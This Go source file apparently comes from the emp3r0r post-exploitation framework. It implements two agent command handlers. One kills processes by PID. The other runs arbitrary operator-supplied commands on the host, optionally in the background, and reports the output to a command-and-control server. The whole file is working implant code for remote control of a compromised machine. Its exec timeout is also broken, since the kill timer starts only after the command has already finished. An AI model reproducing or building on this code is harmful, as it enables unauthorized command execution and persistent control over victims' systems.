package handler

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// killCmdRun kills the specified process(es).
func killCmdRun(cmd *cobra.Command, args []string) {
	// Check if PIDs are provided via positional arguments (support both modes)
	var pidsToKill []int

	// First try to get PID from flag
	pid, _ := cmd.Flags().GetInt("pid")
	if pid != 0 {
		pidsToKill = append(pidsToKill, pid)
	}

	// Then parse any positional arguments as PIDs
	for _, arg := range args {
		// Clean up the argument (remove any trailing '+' from CC operator)
		cleanArg := strings.TrimSuffix(arg, "+")
		if cleanArg == "" {
			continue
		}

		// Handle space-separated PIDs in a single argument
		pidStrs := strings.Fields(cleanArg)
		for _, pidStr := range pidStrs {
			parsedPid, err := strconv.Atoi(pidStr)
			if err != nil {
				c2transport.NotifyC2(cmd, "Error: invalid PID '%s': %v", pidStr, err)
				return
			}
			if parsedPid <= 0 {
				c2transport.NotifyC2(cmd, "Error: invalid PID '%d': PID must be positive", parsedPid)
				return
			}
			pidsToKill = append(pidsToKill, parsedPid)
		}
	}

	if len(pidsToKill) == 0 {
		c2transport.NotifyC2(cmd, "Error: no PID specified. Usage: kill <pid> [pid...] or kill --pid <pid>")
		return
	}

	var results []string
	var hasErrors bool

	for _, targetPid := range pidsToKill {
		// Check if process exists first
		proc, err := os.FindProcess(targetPid)
		if err != nil {
			hasErrors = true
			// On Unix-like systems, FindProcess rarely fails, but let's handle it
			results = append(results, fmt.Sprintf("PID %d: Failed to find process: %v", targetPid, err))
			continue
		}

		// Attempt to kill the process
		err = proc.Kill()
		if err != nil {
			hasErrors = true
			// Provide more specific error messages
			if strings.Contains(err.Error(), "no such process") {
				results = append(results, fmt.Sprintf("PID %d: Process not found (may have already exited)", targetPid))
			} else if strings.Contains(err.Error(), "permission denied") {
				results = append(results, fmt.Sprintf("PID %d: Permission denied (insufficient privileges)", targetPid))
			} else if strings.Contains(err.Error(), "operation not permitted") {
				results = append(results, fmt.Sprintf("PID %d: Operation not permitted (may be a system process)", targetPid))
			} else {
				results = append(results, fmt.Sprintf("PID %d: Failed to kill process: %v", targetPid, err))
			}
		} else {
			results = append(results, fmt.Sprintf("PID %d: Successfully killed", targetPid))
		}
	}

	// Format the output
	status := "Success"
	if hasErrors {
		status = "Partial failure"
		if len(pidsToKill) == 1 {
			status = "Failed"
		}
	}

	output := fmt.Sprintf("Kill operation result (%s):\n%s", status, strings.Join(results, "\n"))
	c2transport.NotifyC2(cmd, "%s", output)
}

// execCmdRun executes a command and returns its output.
func execCmdRun(cmd *cobra.Command, args []string) {
	cmdStr, _ := cmd.Flags().GetString("cmd")
	if cmdStr == "" {
		c2transport.NotifyC2(cmd, "exec: empty command")
		return
	}
	parsed := util.ParseCmd(cmdStr)
	if runtime.GOOS == "windows" && !strings.HasSuffix(parsed[0], ".exe") {
		parsed[0] += ".exe"
	}
	execCmd := exec.Command(parsed[0], parsed[1:]...)
	var outBuf bytes.Buffer
	execCmd.Stdout = &outBuf
	execCmd.Stderr = &outBuf
	err := execCmd.Start()
	if err != nil {
		c2transport.NotifyC2(cmd, "exec failed: %v", err)
		return
	}
	// If not running in background, wait with a timeout.
	keepRunning, _ := cmd.Flags().GetBool("bg")
	if !keepRunning {
		execCmd.Wait()
		go func() {
			// kill after 10 seconds if still alive
			time.Sleep(10 * time.Second)
			if util.IsPIDAlive(execCmd.Process.Pid) {
				_ = execCmd.Process.Kill()
			}
		}()
	} else {
		c2transport.NotifyC2(cmd, "Command '%s' running in background, PID %d", cmdStr, execCmd.Process.Pid)
		return
	}
	c2transport.NotifyC2(cmd, "%s", outBuf.String())
}
